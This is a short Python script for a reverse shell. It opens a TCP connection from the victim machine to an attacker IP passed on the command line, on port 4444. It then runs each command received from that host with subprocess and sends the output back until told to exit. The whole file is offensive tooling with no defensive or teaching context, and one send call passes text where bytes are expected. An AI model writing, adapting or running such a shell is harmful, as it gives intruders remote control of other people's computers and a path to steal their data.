from subprocess import PIPE, Popen
from socket import *
import sys

# Define the attacker's IP address and port to connect back to
ATTACKER_IP = sys.argv[1]
ATTACKER_PORT = 4444 

def connect_to_attacker():
    # Create a socket for communication
    clientSocket = socket(AF_INET, SOCK_STREAM)
    # Connect to the attacker's IP and port
    clientSocket.connect((ATTACKER_IP, ATTACKER_PORT))
    
    # Send initial message to the server
    clientSocket.send("Connection established!")

    # Receive command from the attacker
    command = clientSocket.recv(4064).decode()

    while command != "exit":

        # Execute the received command
        proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
        result, err = proc.communicate()
        clientSocket.send(result)

        # Receive command from the attacker
        command = clientSocket.recv(4064).decode()

    clientSocket.close()

if __name__ == "__main__":
    connect_to_attacker()
